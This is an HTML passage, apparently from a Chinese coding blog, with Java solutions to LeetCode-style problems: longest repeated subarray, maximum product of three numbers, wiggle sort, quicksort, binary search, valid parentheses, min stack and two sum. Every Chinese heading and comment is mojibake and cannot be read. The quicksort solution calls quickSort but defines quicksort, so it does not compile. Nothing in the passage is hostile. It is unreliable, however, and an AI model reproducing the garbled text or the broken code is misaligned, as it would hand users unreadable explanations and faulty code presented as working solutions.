Math.max(dp[j] + <span class="number">1</span>, dp[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res = Math.max(res, dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="718-æœ€é•¿é‡å¤å­æ•°ç»„"><a href="#718-æœ€é•¿é‡å¤å­æ•°ç»„" class="headerlink" title="718. æœ€é•¿é‡å¤å­æ•°ç»„"></a><a href="https://leetcode-cn.com/problems/maximum-length-of-repeated-subarray/">718. æœ€é•¿é‡å¤å­æ•°ç»„</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findLength</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums1[i - <span class="number">1</span>] == nums2[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                    max = Math.max(max, dp[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="æ’åº"><a href="#æ’åº" class="headerlink" title="æ’åº"></a>æ’åº</h2><h3 id="628-ä¸‰ä¸ªæ•°çš„æœ€å¤§ä¹˜ç§¯-x2F-x2F"><a href="#628-ä¸‰ä¸ªæ•°çš„æœ€å¤§ä¹˜ç§¯-x2F-x2F" class="headerlink" title="628. ä¸‰ä¸ªæ•°çš„æœ€å¤§ä¹˜ç§¯&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/maximum-product-of-three-numbers/">628. ä¸‰ä¸ªæ•°çš„æœ€å¤§ä¹˜ç§¯</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å…ˆæ’åº</span></span><br><span class="line"><span class="comment">// å¦‚æœæ•°ç»„ä¸­å…¨æ˜¯éè´Ÿæ•°ï¼Œåˆ™æ’åºåæœ€å¤§çš„ä¸‰ä¸ªæ•°ç›¸ä¹˜å³ä¸ºæœ€å¤§ä¹˜ç§¯ï¼›å¦‚æœå…¨æ˜¯éæ­£æ•°ï¼Œåˆ™æœ€å¤§çš„ä¸‰ä¸ªæ•°ç›¸ä¹˜åŒæ ·ä¹Ÿä¸ºæœ€å¤§ä¹˜ç§¯ã€‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¦‚æœæ•°ç»„ä¸­æœ‰æ­£æ•°æœ‰è´Ÿæ•°ï¼Œåˆ™æœ€å¤§ä¹˜ç§¯æ—¢å¯èƒ½æ˜¯ä¸‰ä¸ªæœ€å¤§æ­£æ•°çš„ä¹˜ç§¯ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸¤ä¸ªæœ€å°è´Ÿæ•°ï¼ˆå³ç»å¯¹å€¼æœ€å¤§ï¼‰ä¸æœ€å¤§æ­£æ•°çš„ä¹˜ç§¯ã€‚</span></span><br><span class="line"><span class="comment">//æ±‚å‡ºä¸‰ä¸ªæœ€å¤§æ­£æ•°çš„ä¹˜ç§¯ï¼Œä»¥åŠä¸¤ä¸ªæœ€å°è´Ÿæ•°ä¸æœ€å¤§æ­£æ•°çš„ä¹˜ç§¯ï¼ŒäºŒè€…ä¹‹é—´çš„æœ€å¤§å€¼å³ä¸ºæ‰€æ±‚ç­”æ¡ˆã€‚</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumProduct</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">    <span class="keyword">return</span> Math.max(nums[<span class="number">0</span>]*nums[<span class="number">1</span>]*nums[n-<span class="number">1</span>], nums[n-<span class="number">3</span>]*nums[n-<span class="number">2</span>]*nums[n-<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// çº¿æ€§æ‰«æ</span></span><br><span class="line"><span class="comment">// åªè¦æ±‚å‡ºæ•°ç»„ä¸­æœ€å¤§çš„ä¸‰ä¸ªæ•°ä»¥åŠæœ€å°çš„ä¸¤ä¸ªæ•°ï¼Œå¯ä»¥ä¸ç”¨æ’åºï¼Œç”¨çº¿æ€§æ‰«æç›´æ¥å¾—å‡ºè¿™äº”ä¸ªæ•°ã€‚</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumProduct</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">min1</span> <span class="operator">=</span> Integer.MAX_VALUE, min2 = Integer.MAX_VALUE;</span><br><span class="line">    <span class="type">int</span> <span class="variable">max1</span> <span class="operator">=</span> Integer.MIN_VALUE, max2 = Integer.MIN_VALUE, max3 = Integer.MIN_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> x: nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x &lt; min1) &#123;</span><br><span class="line">        min2 = min1;</span><br><span class="line">        min1 = x;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; min2) &#123;</span><br><span class="line">        min2 = x;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (x &gt; max1) &#123;</span><br><span class="line">      	max3 = max2;</span><br><span class="line">        max2 = max1;</span><br><span class="line">        max1 = x;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; max2) &#123;</span><br><span class="line">        max3 = max2;</span><br><span class="line">        max2 = x;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; max3) &#123;</span><br><span class="line">        max3 = x;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Math.max(min1 * min2 * max1, max3 * max2 * max1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="324-æ‘†åŠ¨æ’åº-II-x2F"><a href="#324-æ‘†åŠ¨æ’åº-II-x2F" class="headerlink" title="324. æ‘†åŠ¨æ’åº II&#x2F;"></a><a href="https://leetcode-cn.com/problems/wiggle-sort-ii/">324. æ‘†åŠ¨æ’åº II</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å°½é‡å°†å°æ•°éƒ¨åˆ†çš„æœ€å¤§æ•°æ”¾åœ¨è¾¹ä¸Šï¼Œè¿™æ ·åªç”¨é è¿‘ä¸€ä¸ªå¤§æ•°éƒ¨åˆ†çš„æœ€å¤§æ•°ã€‚</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">wiggleSort</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] help = nums.clone();</span><br><span class="line">        Arrays.sort(help);</span><br><span class="line">        <span class="type">int</span> <span class="variable">N</span> <span class="operator">=</span> nums.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            nums[i] = help[--N];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            nums[i] = help[--N];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ’åº-NC140-x2F"><a href="#æ’åº-NC140-x2F" class="headerlink" title="æ’åº(NC140)&#x2F;"></a><a href="https://www.nowcoder.com/practice/2baf799ea0594abd974d37139de27896?tpId=196&rp=1&ru=/ta/job-code-total&qru=/ta/job-code-total/question-ranking&tab=answerKey">æ’åº(NC140)</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] MySort (<span class="type">int</span>[] arr) &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quicksort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> end;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[j] &gt;= temp) j--;</span><br><span class="line">            arr[i] = arr[j];</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[i] &lt;= temp) i++;</span><br><span class="line">            arr[j] = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        arr[i] = temp;</span><br><span class="line">        quickSort(arr, start, i - <span class="number">1</span>);</span><br><span class="line">        quickSort(arr, i + <span class="number">1</span>, end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-21-è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢"><a href="#å‰‘æŒ‡-Offer-21-è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢" class="headerlink" title="å‰‘æŒ‡ Offer 21. è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢"></a><a href="https://leetcode-cn.com/problems/diao-zheng-shu-zu-shun-xu-shi-qi-shu-wei-yu-ou-shu-qian-mian-lcof/">å‰‘æŒ‡ Offer 21. è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶æ•°å‰é¢</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] exchange(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[left] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[right] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[left];</span><br><span class="line">                nums[left] = nums[right];</span><br><span class="line">                nums[right] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-53-I-åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾æ•°å­—-I"><a href="#å‰‘æŒ‡-Offer-53-I-åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾æ•°å­—-I" class="headerlink" title="å‰‘æŒ‡ Offer 53 - I. åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾æ•°å­— I"></a><a href="https://leetcode-cn.com/problems/zai-pai-xu-shu-zu-zhong-cha-zhao-shu-zi-lcof/">å‰‘æŒ‡ Offer 53 - I. åœ¨æ’åºæ•°ç»„ä¸­æŸ¥æ‰¾æ•°å­— I</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// äºŒåˆ†, æ³¨æ„&gt;&gt;çš„ä¼˜å…ˆçº§æ¯”+å·ä½, ä¼šå…ˆç®—+,ç„¶åå†&gt;&gt;; æ‰€ä»¥å¾—åŠ æ‹¬å·</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + ((right - left) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (target == nums[mid]) &#123;</span><br><span class="line">                count++;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> mid;</span><br><span class="line">                <span class="keyword">while</span> (left &lt; i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nums[--i] != target) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">                i = mid;</span><br><span class="line">                <span class="keyword">while</span> (right &gt; i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nums[++i] != target) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; nums[mid]) &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="69-x-çš„å¹³æ–¹æ ¹"><a href="#69-x-çš„å¹³æ–¹æ ¹" class="headerlink" title=" 69. x çš„å¹³æ–¹æ ¹"></a><a href="https://leetcode-cn.com/problems/sqrtx"> 69. x çš„å¹³æ–¹æ ¹</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> x / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + ((right - left + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// x = 4çš„æ—¶å€™ä¼šæ­»å¾ªç¯</span></span><br><span class="line">            <span class="comment">//int mid = left + ((right - left) &gt;&gt; 1);</span></span><br><span class="line">            <span class="comment">// é¿å…ä¹˜æ³•æº¢å‡º</span></span><br><span class="line">            <span class="keyword">if</span> (mid == x / mid) &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (mid &gt; x / mid) &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="704-äºŒåˆ†æŸ¥æ‰¾"><a href="#704-äºŒåˆ†æŸ¥æ‰¾" class="headerlink" title=" 704. äºŒåˆ†æŸ¥æ‰¾"></a><a href="https://leetcode-cn.com/problems/binary-search"> 704. äºŒåˆ†æŸ¥æ‰¾</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[<span class="number">0</span>] || target &gt; nums[nums.length - <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> l + ((r - l) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[mid]) &#123;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="æ ˆ"><a href="#æ ˆ" class="headerlink" title="æ ˆ"></a>æ ˆ</h2><h3 id="20-æœ‰æ•ˆçš„æ‹¬å·-x2F-x2F"><a href="#20-æœ‰æ•ˆçš„æ‹¬å·-x2F-x2F" class="headerlink" title="20. æœ‰æ•ˆçš„æ‹¬å·&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/valid-parentheses/">20. æœ‰æ•ˆçš„æ‹¬å·</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        Stack&lt;Character&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="string">&#x27;)&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                stack.push(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stack.isEmpty() || sc[i] != stack.pop()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="å‰‘æŒ‡-Offer-31-æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—"><a href="#å‰‘æŒ‡-Offer-31-æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—" class="headerlink" title="å‰‘æŒ‡ Offer 31. æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—"></a><a href="https://leetcode-cn.com/problems/zhan-de-ya-ru-dan-chu-xu-lie-lcof/">å‰‘æŒ‡ Offer 31. æ ˆçš„å‹å…¥ã€å¼¹å‡ºåºåˆ—</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆ¤æ–­åˆä¸åˆæ³•ï¼Œç”¨ä¸ªæ ˆè¯•ä¸€è¯•: </span></span><br><span class="line"><span class="comment">// æŠŠå‹æ ˆçš„å…ƒç´ æŒ‰é¡ºåºå‹å…¥ï¼Œå½“æ ˆé¡¶å…ƒç´ å’Œå‡ºæ ˆçš„ç¬¬ä¸€ä¸ªå…ƒç´ ç›¸åŒï¼Œåˆ™å°†è¯¥å…ƒç´ å¼¹å‡ºï¼Œå‡ºæ ˆåˆ—è¡¨æŒ‡é’ˆåç§»å¹¶ç»§ç»­åˆ¤æ–­ã€‚</span></span><br><span class="line"><span class="comment">// æœ€ååˆ¤æ–­å‡ºæ ˆåˆ—è¡¨æŒ‡é’ˆæ˜¯å¦æŒ‡å‘å‡ºæ ˆåˆ—è¡¨çš„æœ«å°¾å³å¯ã€‚</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">validateStackSequences</span><span class="params">(<span class="type">int</span>[] pushed, <span class="type">int</span>[] popped)</span> &#123;</span><br><span class="line">        Deque&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> e :</span><br><span class="line">                pushed) &#123;</span><br><span class="line">            stack.push(e);</span><br><span class="line">            <span class="keyword">while</span> (j &lt; popped.length &amp;&amp; !stack.isEmpty() &amp;&amp; popped[j] == stack.peek()) &#123;</span><br><span class="line">                stack.pop();</span><br><span class="line">                j++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> stack.isEmpty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="155-æœ€å°æ ˆ"><a href="#155-æœ€å°æ ˆ" class="headerlink" title=" 155. æœ€å°æ ˆ"></a><a href="https://leetcode-cn.com/problems/min-stack"> 155. æœ€å°æ ˆ</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MinStack</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; s1;</span><br><span class="line">    <span class="keyword">private</span> Stack&lt;Integer&gt; s2;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MinStack</span><span class="params">()</span> &#123;</span><br><span class="line">        s1 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        s2 = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">push</span><span class="params">(<span class="type">int</span> val)</span> &#123;</span><br><span class="line">        s1.push(val);</span><br><span class="line">        <span class="keyword">if</span> (!s2.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s2.peek() &gt;= val) &#123;</span><br><span class="line">                s2.push(val);</span><br><span class="line">            &#125; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            s2.push(val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">pop</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">pop</span> <span class="operator">=</span> s1.pop();</span><br><span class="line">        <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> s2.peek();</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (min == pop) &#123;</span><br><span class="line">            s2.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">top</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> s1.peek();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMin</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> s2.peek();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="å“ˆå¸Œè¡¨"><a href="#å“ˆå¸Œè¡¨" class="headerlink" title="å“ˆå¸Œè¡¨"></a>å“ˆå¸Œè¡¨</h2><h3 id="1-ä¸¤æ•°ä¹‹å’Œ-x2F-x2F"><a href="#1-ä¸¤æ•°ä¹‹å’Œ-x2F-x2F" class="headerlink" title="1. ä¸¤æ•°ä¹‹å’Œ&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/two-sum/">1. ä¸¤æ•°ä¹‹å’Œ</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(target - nums[i])) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[] &#123;i, 